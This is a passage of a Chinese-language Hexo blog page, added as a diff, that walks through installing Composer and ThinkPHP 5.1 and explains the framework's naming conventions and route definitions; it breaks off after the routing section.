@@ -1,0 +1,1381 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=5.1.3">
+
+
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="thinkphp框架开发学习以及框架漏洞学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thinkphp">
+<meta property="og:url" content="http://www.lxhsec.com/2020/01/19/thinkphp/index.html">
+<meta property="og:site_name" content="lyxhh">
+<meta property="og:description" content="thinkphp框架开发学习以及框架漏洞学习。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/rumen-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/rumen-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/composer-00.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/composer-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/composer-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/composer-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-00.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-03-00.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-args-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-args-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-args-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-args-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-args-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-args-06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-args-07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-forward-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-luyou-forward-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-args-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-args-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-args-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-args-08.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-args-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-args-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-args-06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-args-07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-resp-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-resp-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-resp-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-resp-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-view-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-view-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-view-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-view-06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-view-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-view-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-view-07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-view-08.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-database-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-database-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-model-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-model-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-vuln-rce-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-vuln-rce-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-vuln-rce-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-vuln-rce-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-vuln-rce1-00.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-vuln-rce1-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-vuln-rce1-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-vuln-rce1-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-vuln-rce1-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-insert-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-insert-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-insert-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-insert-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-and-info-xielou-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-and-info-xielou-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-orderby-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-and-info-xielou-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-and-info-xielou-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/thinkphp-sqli-vuln-and-info-xielou-05.png">
+<meta property="og:updated_time" content="2020-02-01T08:01:15.392Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="thinkphp">
+<meta name="twitter:description" content="thinkphp框架开发学习以及框架漏洞学习。">
+<meta name="twitter:image" content="http://www.lxhsec.com/2020/01/19/thinkphp/rumen-01.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lxhsec.com/2020/01/19/thinkphp/"/>
+
+
+
+
+
+  <title>thinkphp | lyxhh</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lyxhh</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lxhsec.com/2020/01/19/thinkphp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lyxhh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lyxhh">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">thinkphp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-19T16:06:15+08:00">
+                2020-01-19
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-02-01T16:01:15+08:00">
+                2020-02-01
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>thinkphp框架开发学习以及框架漏洞学习。<a id="more"></a></p>
+<h1 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>php是世界上最好的语言，<br>而thinkphp则是世界上最好的php框架。</p>
+<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>这里使用phpstudy2014作为学习的开发环境。<br>版本为<code>Apache + PHP 5.6n</code>,并配置环境变量。</p>
+<p><img src="/2020/01/19/thinkphp/rumen-01.png" alt="rumen-01"></p>
+<p>重新打开cmd窗口，验证环境变量是否生效。<br><img src="/2020/01/19/thinkphp/rumen-02.png" alt="rumen-02"></p>
+<h3 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h3><p><a href="https://getcomposer.org/" target="_blank" rel="external">composer</a>是一个php的包管理工具，用来解决依赖问题，类似于python的pip。</p>
+<p>从5.1之后，官网不再提供下载版本，所以我们需要使用composer。<br>不使用git是因为git安装 步骤会比composer多一步。</p>
+<p><img src="/2020/01/19/thinkphp/composer-00.png" alt="composer-00"></p>
+<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><a href="https://getcomposer.org/download/" target="_blank" rel="external">下载地址</a></p>
+<p>下载下来会是一个phar后缀文件。<br><img src="/2020/01/19/thinkphp/composer-01.png" alt="composer-01"></p>
+<p>然后将它放在你的php.exe目录下，</p>
+<p>在打开cmd，执行<br><code>echo @php &quot;%~dp0composer.phar&quot; %*&gt;composer.bat</code></p>
+<p>生成<code>composer.bat</code>文件.</p>
+<p>然后 <code>composer.bat -V</code>，验证.<br><img src="/2020/01/19/thinkphp/composer-02.png" alt="composer-02"></p>
+<p>当然你也可以不生成<code>.bat</code>文件，这样每次执行前面要加php。<br><code>php composer.phar -V</code></p>
+<h4 id="切换源"><a href="#切换源" class="headerlink" title="切换源"></a>切换源</h4><p>由于GFW的原因，导致国外的网站连接速度较慢，因此需要更换源，来进行快速安装。</p>
+<p><code>composer config -g repo.packagist composer https://packagist.phpcomposer.com</code></p>
+<p><a href="https://blog.thinkphp.cn/1147952" target="_blank" rel="external">备选方案:</a><br><code>composer config -g repo.packagist composer https://packagist.laravel-china.org</code></p>
+<p><code>composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</code></p>
+<p>这里我选择修改为阿里的源，修改成功后可以先查看一下配置<br><code>composer config -g -l | findstr repositories.packagist.org.url</code></p>
+<p>第二行repositories.packagist.org.url 如果是阿里的就代表成功<br><img src="/2020/01/19/thinkphp/composer-03.png" alt="composer-03"></p>
+<h3 id="thinkphp安装"><a href="#thinkphp安装" class="headerlink" title="thinkphp安装"></a>thinkphp安装</h3><p><img src="/2020/01/19/thinkphp/thinkphp-00.png" alt="thinkphp-00"></p>
+<p>按照官网提示 执行：<br><code>composer create-project topthink/think=5.1.* tp5</code></p>
+<p><code>=5.1.*</code>是指定版本，如果不指定默认就是最新的。</p>
+<p>执行完就出错了，需要开启 <code>openssl extension</code>扩展。</p>
+<p>在php.ini中，打开<code>extension=php_openssl.dll</code>,然后重启phpstudy。<br><img src="/2020/01/19/thinkphp/thinkphp-01.png" alt="thinkphp-01"></p>
+<p>再次执行,成功:<br><img src="/2020/01/19/thinkphp/thinkphp-02.png" alt="thinkphp-02"></p>
+<p>现在只需要做最后一步来验证是否正常运行。</p>
+<p>在浏览器中输入地址：</p>
+<p><a href="http://localhost/tp5/public/" target="_blank" rel="external">http://localhost/tp5/public/</a><br>如果浏览器输出如图所示：<br><img src="/2020/01/19/thinkphp/thinkphp-03.png" alt="thinkphp-03"></p>
+<p>恭喜你，现在已经完成ThinkPHP5.1的安装！</p>
+<h3 id="开发规范"><a href="#开发规范" class="headerlink" title="开发规范"></a>开发规范</h3><h4 id="目录和文件"><a href="#目录和文件" class="headerlink" title="目录和文件"></a>目录和文件</h4><ul>
+<li>目录使用小写+下划线；</li>
+<li>类库、函数文件统一以.php为后缀；</li>
+<li>类的文件名均以命名空间定义，并且命名空间的路径和类库文件所在路径一致；</li>
+<li>类文件采用驼峰法命名（首字母大写），其它文件采用小写+下划线命名；</li>
+<li><strong>类名和类文件名保持一致</strong>，统一采用驼峰法命名（首字母大写）；</li>
+</ul>
+<h4 id="函数和类、属性命名"><a href="#函数和类、属性命名" class="headerlink" title="函数和类、属性命名"></a>函数和类、属性命名</h4><ul>
+<li>类的命名采用驼峰法（首字母大写），例如 <code>User</code>、<code>UserType</code>，默认不需要添加后缀，例如<code>UserController</code>应该直接命名为<code>User</code>；</li>
+<li>函数的命名使用小写字母和下划线（小写字母开头）的方式，例如 <code>get_client_ip</code>；</li>
+<li>方法的命名使用驼峰法（首字母小写），例如 <code>getUserName</code>；</li>
+<li>属性的命名使用驼峰法（首字母小写），例如 <code>tableName</code>、<code>instance</code>；</li>
+<li>特例：以双下划线<strong>打头的函数或方法作为魔术方法，例如 `</strong>call<code>和</code>__autoload`</li>
+</ul>
+<h4 id="常量和配置"><a href="#常量和配置" class="headerlink" title="常量和配置"></a>常量和配置</h4><ul>
+<li>常量以大写字母和下划线命名，例如 <code>APP_PATH</code>；</li>
+<li>配置参数以小写字母和下划线命名，例如 <code>url_route_on</code> 和<code>url_convert</code>；</li>
+<li>环境变量定义使用大写字母和下划线命名，例如<code>APP_DEBUG</code>；</li>
+</ul>
+<h4 id="数据表和字段"><a href="#数据表和字段" class="headerlink" title="数据表和字段"></a>数据表和字段</h4><ul>
+<li>数据表和字段采用小写加下划线方式命名，并注意字段名不要以下划线开头，例如 <code>think_user</code> 表和 <code>user_name</code>字段，不建议使用驼峰和中文作为数据表及字段命名。</li>
+</ul>
+<h3 id="路由定义"><a href="#路由定义" class="headerlink" title="路由定义"></a>路由定义</h3><h4 id="pathinfo模式"><a href="#pathinfo模式" class="headerlink" title="pathinfo模式"></a>pathinfo模式</h4><p>ThinkPHP5.1的路由定义更加对象化，并且默认开启路由（不能关闭），如果一个URL没有定义路由，则采用默认的PATH_INFO 模式访问URL：</p>
+<p><code>http://serverName/index.php/module/controller/action/param/value/...</code></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-luyou-01.png" alt="thinkphp-luyou-01"></p>
+<h4 id="自定义路由"><a href="#自定义路由" class="headerlink" title="自定义路由"></a>自定义路由</h4><p>路由文件的位置:<br>项目目录/routes/route.php文件中进行如下格式的定义。</p>
+<p>最基础的路由定义方法是：</p>
+<p><code>Route::rule(&#39;路由表达式&#39;,&#39;路由地址&#39;,&#39;请求类型&#39;);</code></p>
+<p>除了路由表达式和路由地址是必须的外，其它参数均为可选。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 注册路由到demo模块的Test控制器的firstmethod操作</span></div><div class="line">Route::rule(<span class="string">'/first'</span>,<span class="string">'demo/Test/firstmethod'</span>);</div></pre></td></tr></table></figure>
+<p>我们访问：<br><code>http://localhost/tp5/public/index.php/first</code></p>
+<p>会自动路由到：<br><code>http://localhost/tp5/public/index.php/demo/test/firstmethod</code><br>并且原来 pathinfo模式的访问地址会自动失效，访问会报异常，只能通过自定义的路由进行访问。</p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-luyou-02.png" alt="thinkphp-luyou-02"></p>
+<p>可以在rule方法中指定请求类型（不指定的话默认为任何请求类型有效），例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Route::rule(&apos;/first&apos;,&apos;demo/Test/firstmethod&apos;,&apos;POST&apos;);</div><div class="line">//表示定义的路由规则在POST请求下才有效。</div></pre></td></tr></table></figure></p>
+<p>如果要定义GET和POST请求支持的路由规则，可以用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Route::rule(&apos;new/:id&apos;,&apos;News/read&apos;,&apos;GET|POST&apos;);</div></pre></td></tr></table></figure></p>
+<p>不过通常我们更愿意使用对应请求类型的快捷方法，包括：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>描述</th>
+<th>快捷方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>GET请求</td>
+<td>get</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>POST请求</td>
+<td>post</td>
+</tr>
+<tr>
+<td>*</td>
+<td>任何请求类型</td>
+<td>any</td>
+</tr>
+<tr>
+<td>…</td>
+<td>…</td>
+<td>…</td>
+</tr>
+</tbody>
+</table>
+<p>快捷注册方法的用法为：</p>
+<blockquote>
+<p>Route::快捷方法名(‘路由表达式’,’路由地址’);</p>
+</blockquote>
+<p>例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Route::rule(<span class="string">'/first'</span>,<span class="string">'demo/Test/firstmethod'</span>,<span class="string">'POST'</span>);</div><div class="line">↓</div><div class="line">Route::post(<span class="string">'/first'</span>,<span class="string">'demo/Test/firstmethod'</span>);</div></pre></td></tr></table></figure></p>
+<p>注册多个路由规则后，系统会依次遍历注册过的满足请求类型的路由规则，<br>一旦匹配到正确的路由规则后则开始执行最终的调度方法，后续规则就不再检测。</p>
+<p>例如：<br><img src="/2020/01/19/thinkphp/thinkphp-luyou-03-00.png" alt="thinkphp-luyou-03-00"></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-luyou-03.png" alt="thinkphp-luyou-03"></p>
+<h3 id="路由请求参数"><a href="#路由请求参数" class="headerlink" title="路由请求参数"></a>路由请求参数</h3><p>路由表达式中，每个以<code>:</code>开头的参数都表示HTTP中的请求参数，并且会自动绑定到操作方法的对应参数。</p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-luyou-args-01.png" alt="thinkphp-luyou-args-01"></p>
+<p>不正确绑定操作方法的对应的参数，会报错，如下：<br><img src="/2020/01/19/thinkphp/thinkphp-luyou-args-02.png" alt="thinkphp-luyou-args-02"></p>
+<p>请求参数规则：</p>
+<blockquote>
+<p>系统默认的变量规则设置是<code>\w+</code>，只会匹配字母、数字和下划线字符，并不会匹配特殊符号和中文，需要定义变量规则或者调整默认变量规则。</p>
+</blockquote>
+<p>V5.1.14+版本开始，可以在app.php配置文件中自定义默认的变量规则：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;default_route_pattern&apos;	=&gt;	&apos;[\w\-]+&apos;,</div></pre></td></tr></table></figure></p>
+<p>也可以在规则路由中为变量用正则的方式指定变量规则，指定变量规则是为了 弥补 php弱类型语言 导致的各种安全问题。</p>
+<h4 id="局部变量规则"><a href="#局部变量规则" class="headerlink" title="局部变量规则"></a>局部变量规则</h4><p>仅在当前路由有效：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Route::get(<span class="string">'test1/:id'</span>,<span class="function"><span class="keyword">function</span> <span class="params">($id)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="string">"www.lxhsec.com, id:"</span> . $id;</div><div class="line">&#125;)-&gt;pattern([<span class="string">'id'</span> =&gt; <span class="string">'\d+'</span>]);</div></pre></td></tr></table></figure>
+<p>当请求不是数字时，报错如下：<br><img src="/2020/01/19/thinkphp/thinkphp-luyou-args-03.png" alt="thinkphp-luyou-args-03"></p>
+<p>当开头是数字，后面有字符串时，会将字符串过滤掉：<br><img src="/2020/01/19/thinkphp/thinkphp-luyou-args-04.png" alt="thinkphp-luyou-args-04"></p>
+<p><strong>Note:</strong> 不需要开头添加<code>^</code>或者在最后添加<code>$</code>，也不支持模式修饰符，系统会自动添加。</p>
+<h4 id="全局变量规则"><a href="#全局变量规则" class="headerlink" title="全局变量规则"></a>全局变量规则</h4><p>全部路由有效，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 设置name变量规则（采用正则定义）</span></div><div class="line">Route::pattern(<span class="string">'id'</span>, <span class="string">'\d+'</span>);</div><div class="line"><span class="comment">// 支持批量添加</span></div><div class="line"><span class="comment">//Route::pattern([</span></div><div class="line"><span class="comment">//    'name' =&gt; '\w+',</span></div><div class="line"><span class="comment">//    'id'   =&gt; '\d+',</span></div><div class="line"><span class="comment">//]);</span></div><div class="line"></div><div class="line">Route::get(<span class="string">'test1/:id'</span>,<span class="function"><span class="keyword">function</span> <span class="params">($id)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">"www.lxhsec.com, id:"</span> . $id;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
+<p><img src="/2020/01/19/thinkphp/thinkphp-luyou-args-05.png" alt="thinkphp-luyou-args-05"></p>
+<h4 id="可选变量"><a href="#可选变量" class="headerlink" title="可选变量"></a>可选变量</h4><p>变量用<code>[]</code>包含起来后就表示该变量是路由匹配的可选变量。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Route::get(<span class="string">'blog/:year/[:month]'</span>,<span class="string">'demo/Test/firstmethod'</span>);</div></pre></td></tr></table></figure>
+<p>以上定义路由规则后，下面的URL访问地址都可以被正确的路由匹配：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost/tp5/public/index.php/blog/11/22</div><div class="line">http://localhost/tp5/public/index.php/blog/11</div></pre></td></tr></table></figure></p>
+<p><strong>Note:</strong> 可选参数只能放到路由表达式的最后，如果在中间使用了可选参数的话，后面的变量都会变成可选参数。</p>
+<h4 id="路由完全匹配"><a href="#路由完全匹配" class="headerlink" title="路由完全匹配"></a>路由完全匹配</h4><p>规则匹配检测的时候默认只是对URL从头开始匹配，只要URL地址包含了定义的路由规则就会匹配成功，如果希望URL进行完全匹配，可以在路由表达式最后使用$符号，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Route::get(&apos;blog/:new$&apos;,&apos;demo/Test/firstmethod&apos;);</div></pre></td></tr></table></figure></p>
+<p>访问:<br><code>http://localhost/tp5/public/index.php/blog/11</code><br>会匹配成功,而<br><code>http://localhost/tp5/public/index.php/blog/11/11</code>则会匹配失败。</p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-luyou-args-06.png" alt="thinkphp-luyou-args-06"></p>
+<p>如果是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Route::get(<span class="string">'blog/:new'</span>,<span class="string">'demo/Test/firstmethod'</span>);</div></pre></td></tr></table></figure></p>
+<p>则上面两种方式的URL访问都可以匹配成功。</p>
+<p>如果需要全局进行URL完全匹配，可以在app.php中设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// 开启路由完全匹配</div><div class="line">&apos;route_complete_match&apos;   =&gt; true,</div></pre></td></tr></table></figure></p>
